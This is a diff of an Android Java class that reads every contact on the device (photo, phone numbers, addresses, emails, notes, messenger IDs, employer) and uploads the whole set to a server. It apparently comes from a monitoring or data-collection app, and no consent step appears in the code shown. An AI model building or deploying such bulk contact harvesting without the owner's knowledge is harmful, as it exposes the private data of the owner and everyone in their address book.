@@ -2,10 +2,18 @@ package com.inet.android.list;
 
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
-import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+import java.util.Set;
 
 import org.json.JSONException;
-import org.json.JSONObject;
+
+import com.inet.android.bs.NetworkChangeReceiver;
+import com.inet.android.request.AppConstants;
+import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
+import com.inet.android.utils.Logging;
 
 import android.content.ContentResolver;
 import android.content.ContentUris;
@@ -20,12 +28,6 @@ import android.provider.ContactsContract.CommonDataKinds.Im;
 import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
 import android.util.Base64;
 
-import com.inet.android.bs.NetworkChangeReceiver;
-import com.inet.android.request.AppConstants;
-import com.inet.android.request.RequestList;
-import com.inet.android.utils.AppSettings;
-import com.inet.android.utils.Logging;
-
 /**
  * ListContact class is designed to get the list of contact
  * 
@@ -34,9 +36,6 @@ import com.inet.android.utils.Logging;
  */
 public class ContactsList extends AsyncTask<Context, Void, Void> {
 	private Context mContext;
-	private ArrayList<String> email = null;
-	private ArrayList<String> emailType = null;
-	private ArrayList<CharSequence> CustomemailType = null;
 
 	private String LOG_TAG = ContactsList.class.getSimpleName().toString();
 	private String complete;
@@ -46,182 +45,138 @@ public class ContactsList extends AsyncTask<Context, Void, Void> {
 
 	public void readContacts() throws JSONException {
 		Logging.doLog(LOG_TAG, "readContact", "readContact");
-		String sendStr = null;
-		JSONObject jsonInfo;
-		JSONObject jsonPhoneType;
-		JSONObject jsonContact;
 		ContentResolver cr = mContext.getContentResolver();
+		Set<Map<String, Object>> listOfMapsForData = new HashSet<Map<String, Object>>();
 
-		version = AppSettings.getSetting(AppConstants.TYPE_LIST_CONTACTS,
-				mContext);
+		version = AppSettings.getSetting(AppConstants.TYPE_LIST_CONTACTS, mContext);
 
 		String encodedImage = null;
 		StringBuilder sAdress;
 
-		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
-				null, null, null);
+		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
 
 		if (NetworkChangeReceiver.isOnline(mContext) != 0) {
 			if (cur.getCount() > 0) {
 				while (cur.moveToNext()) {
 					complete = "0";
-					jsonContact = new JSONObject();
-					jsonInfo = new JSONObject();
-					jsonPhoneType = new JSONObject();
-					email = new ArrayList<String>();
-					emailType = new ArrayList<String>();
+					Map<String, Object> setContact = new HashMap<String, Object>();
+					Map<String, String> typePhone = new HashMap<String, String>();
+					Map<String, String> info = new HashMap<String, String>();
+
 					sAdress = new StringBuilder();
-					CustomemailType = new ArrayList<CharSequence>();
-					String id = cur.getString(cur
-							.getColumnIndex(ContactsContract.Contacts._ID));
-					long idlong = cur.getLong(cur
-							.getColumnIndex(ContactsContract.Contacts._ID));
-					String name = cur
-							.getString(cur
-									.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
-					Uri uri = ContentUris.withAppendedId(
-							ContactsContract.Contacts.CONTENT_URI, idlong);
-					InputStream input = ContactsContract.Contacts
-							.openContactPhotoInputStream(cr, uri);
+					String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+					long idlong = cur.getLong(cur.getColumnIndex(ContactsContract.Contacts._ID));
+					String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+					Uri uri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, idlong);
+					InputStream input = ContactsContract.Contacts.openContactPhotoInputStream(cr, uri);
 					if (input != null) {
 
 						Bitmap pic = BitmapFactory.decodeStream(input);
 						ByteArrayOutputStream bos = new ByteArrayOutputStream();
 						pic.compress(Bitmap.CompressFormat.PNG, 100, bos);
 						byte[] bitmapdata = bos.toByteArray();
-						encodedImage = Base64.encodeToString(bitmapdata,
-								Base64.DEFAULT);
+						encodedImage = Base64.encodeToString(bitmapdata, Base64.DEFAULT);
 						if (!encodedImage.equals(" "))
-							jsonContact.put("photo", encodedImage);
+							setContact.put("photo", encodedImage);
 					}
 					// ----------------------------------------------------------------------------------------------------------------------------------
 					// get the phone number
 					// ---------------------------------------------------------------------
 
-					if (Integer
-							.parseInt(cur.getString(cur
-									.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
+					if (Integer.parseInt(
+							cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
 
-						Cursor pCur = cr
-								.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-										null,
-										ContactsContract.CommonDataKinds.Phone.CONTACT_ID
-												+ " = ?", new String[] { id },
-										null);
+						Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
+								ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
 						while (pCur.moveToNext()) {
 							String mPhone = pCur
-									.getString(pCur
-											.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-							String phoneType = getTipe(pCur
-									.getInt(pCur
-											.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)));
-							jsonPhoneType.put(mPhone, phoneType);
+									.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+							String phoneType = getTipe(
+									pCur.getInt(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)));
+							typePhone.put(mPhone, phoneType);
 						}
 						pCur.close();
 					}
 					// ------------------------------------------
 					// Get Postal Address
 					// -------------------------------------------------
-					String addrWhere = ContactsContract.Data.CONTACT_ID
-							+ " = ? AND " + ContactsContract.Data.MIMETYPE
+					String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE
 							+ " = ?";
-					String[] addrWhereParams = new String[] {
-							id,
+					String[] addrWhereParams = new String[] { id,
 							ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE };
-					Cursor addrCur = cr.query(
-							ContactsContract.Data.CONTENT_URI, null, addrWhere,
-							addrWhereParams, null);
+					Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams,
+							null);
 
 					if (addrCur.getCount() != 0) {
 						while (addrCur.moveToNext()) {
-							String country = addrCur
-									.getString(addrCur
-											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
+							String country = addrCur.getString(
+									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
 							if (country != null)
 								sAdress.append(country);
-							String state = addrCur
-									.getString(addrCur
-											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
+							String state = addrCur.getString(
+									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
 							if (state != null)
 								sAdress.append(state);
 
-							String city = addrCur
-									.getString(addrCur
-											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
+							String city = addrCur.getString(
+									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
 							if (city != null)
 								sAdress.append(city);
-							String street = addrCur
-									.getString(addrCur
-											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
+							String street = addrCur.getString(
+									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
 							if (street != null)
 								sAdress.append(street);
 
-							String postalCode = addrCur
-									.getString(addrCur
-											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
+							String postalCode = addrCur.getString(
+									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
 							if (postalCode != null)
 								sAdress.append(postalCode);
 
-							int type = addrCur
-									.getInt(addrCur
-											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
+							int type = addrCur.getInt(
+									addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
 							if (sAdress.length() != 0)
-								jsonInfo.put("адрес",
-										"(" + getTipeAddress(type) + ") "
-												+ sAdress.toString());
+								info.put("адрес", "(" + getTipeAddress(type) + ") " + sAdress.toString());
 						}
 					}
 					addrCur.close();
 					// ------------------------------------------------------------------------------------------
 					// get email and type
 					// -----------------------------------------------------------------------------------------------------------------------------------------
-					Cursor emailCur = cr.query(
-							ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-							null,
-							ContactsContract.CommonDataKinds.Email.CONTACT_ID
-									+ " = ?", new String[] { id }, null);
+					Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
+							ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[] { id }, null);
 					while (emailCur.moveToNext()) {
 						// This would allow you get several email addresses
 						// if the email addresses were stored in an array
 
 						String sEmail = emailCur
-								.getString(emailCur
-										.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
+								.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
 						int type = emailCur
-								.getInt(emailCur
-										.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
+								.getInt(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
 						String customLabel = emailCur
-								.getString(emailCur
-										.getColumnIndex(ContactsContract.CommonDataKinds.Email.LABEL));
+								.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.LABEL));
 						CharSequence cCustomemailType = ContactsContract.CommonDataKinds.Email
-								.getTypeLabel(mContext.getResources(), type,
-										customLabel);
+								.getTypeLabel(mContext.getResources(), type, customLabel);
 						if (sEmail != null)
-							jsonInfo.put(" e-mail" + "(" + cCustomemailType
-									+ "): ", sEmail);
+							info.put(" e-mail" + "(" + cCustomemailType + "): ", sEmail);
 					}
 					emailCur.close();
 					// ------------------------------------------
 					// Get note
 					// ------------------------------------------
 
-					String noteWhere = ContactsContract.Data.CONTACT_ID
-							+ " = ? AND " + ContactsContract.Data.MIMETYPE
+					String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE
 							+ " = ?";
-					String[] noteWhereParams = new String[] {
-							id,
+					String[] noteWhereParams = new String[] { id,
 							ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE };
 
-					Cursor noteCur = cr.query(
-							ContactsContract.Data.CONTENT_URI, null, noteWhere,
-							noteWhereParams, null);
+					Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams,
+							null);
 					if (noteCur.moveToFirst()) {
 						String note = noteCur
-								.getString(noteCur
-										.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
+								.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
 						if (note != null) {
 							if (!note.equals(""))
-								jsonInfo.put("заметка", note);
+								info.put("заметка", note);
 						}
 					}
 					noteCur.close();
@@ -230,26 +185,20 @@ public class ContactsList extends AsyncTask<Context, Void, Void> {
 					// Get Instant Messenger
 					// ------------------------------------------
 
-					String imWhere = ContactsContract.Data.CONTACT_ID
-							+ " = ? AND " + ContactsContract.Data.MIMETYPE
+					String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE
 							+ " = ?";
-					String[] imWhereParams = new String[] {
-							id,
-							ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
-					Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI,
-							null, imWhere, imWhereParams, null);
+					String[] imWhereParams = new String[] { id, ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
+					Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
 					if (imCur != null) {
 						if (imCur.moveToFirst()) {
 							for (int i = 0; i < imCur.getCount(); i++) {
 
 								String imName = imCur
-										.getString(imCur
-												.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
+										.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
 								String imType;
 								imType = getTipeIm(imCur
-										.getInt(imCur
-												.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL)));
-								jsonInfo.put(imType, imName);
+										.getInt(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL)));
+								info.put(imType, imName);
 								imCur.moveToNext();
 							}
 
@@ -261,89 +210,61 @@ public class ContactsList extends AsyncTask<Context, Void, Void> {
 					// Get Organizations
 					// ------------------------------------------
 
-					String orgWhere = ContactsContract.Data.CONTACT_ID
-							+ " = ? AND " + ContactsContract.Data.MIMETYPE
+					String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE
 							+ " = ?";
-					String[] orgWhereParams = new String[] {
-							id,
+					String[] orgWhereParams = new String[] { id,
 							ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE };
-					Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI,
-							null, orgWhere, orgWhereParams, null);
+					Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);
 					if (orgCur.moveToFirst()) {
 						String orgName = orgCur
-								.getString(orgCur
-										.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
+								.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
 						String title = orgCur
-								.getString(orgCur
-										.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
+								.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
 
 						if (orgName != null) {
 							if (title == null)
-								jsonInfo.put("организация", orgName);
+								info.put("организация", orgName);
 							else
-								jsonInfo.put("организация", orgName + " "
-										+ title);
+								info.put("организация", orgName + " " + title);
 						}
 					}
 					orgCur.close();
 
 					if (name != null) {
 						if (!name.equals(""))
-							jsonContact.put("name", name);
+							setContact.put("name", name);
 					}
-					if (!jsonPhoneType.toString().equals("{}"))
-						jsonContact.put("number", jsonPhoneType);
-
-					jsonContact.put("info", jsonInfo);
-
-					if (sendStr == null)
-						sendStr = jsonContact.toString();
-					else
-						sendStr += "," + jsonContact.toString();
-
-					if (sendStr.length() >= 50000) {
-						Logging.doLog(LOG_TAG, ">= 50000", ">= 50000");
-						sendRequest(sendStr, complete);
-						sendStr = null;
-
-					}
-				}
-				if (sendStr != null) {
-					lastRaw(sendStr);
-					sendStr = null;
-				} else {
-					lastRaw("");
-					sendStr = null;
+					if (!typePhone.isEmpty())
+						setContact.put("number", typePhone);
+					if (!info.isEmpty())
+						setContact.put("info", info);
+					listOfMapsForData.add(setContact);
 
 				}
+				if (listOfMapsForData.isEmpty() != true) {
+					sendRequest(listOfMapsForData);
+					listOfMapsForData = null;
+				} else
+					sendRequest("");
+
 				Logging.doLog(LOG_TAG, "cur.close()", "cur.close()");
 				cur.close();
 			} else {
-				Logging.doLog(LOG_TAG, "contactCursor == null",
-						"contactCursor == null");
-				lastRaw("");
-				sendStr = null;
-
+				Logging.doLog(LOG_TAG, "contactCursor == null", "contactCursor == null");
+				sendRequest("");
 			}
 
 		} else {
 			Logging.doLog(LOG_TAG, "else connect", "else connect");
-			Queue.setList(AppConstants.TYPE_LIST_CONTACTS, version, "0",
-					mContext);
+			Queue.setList(AppConstants.TYPE_LIST_CONTACTS, version, "0", mContext);
 		}
 	}
 
-	private void lastRaw(String sendStr) {
+	private void sendRequest(Object request) {
 		complete = "1";
-		sendRequest(sendStr, complete);
-	}
+		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 .." + version);
 
-	private void sendRequest(String str, String complete) {
-		Logging.doLog(LOG_TAG, "sendRequest: complete " + complete,
-				"sendRequest: complete " + complete);
-		RequestList.sendDemandRequest(str,
-				AppConstants.TYPE_LIST_CONTACTS_REQUEST, complete, version,
-				mContext);
+		RequestList.sendDemandRequest(request, AppConstants.TYPE_LIST_CONTACTS_REQUEST, complete, version, mContext);
 	}
 
 	private String getTipe(int phonetype) {
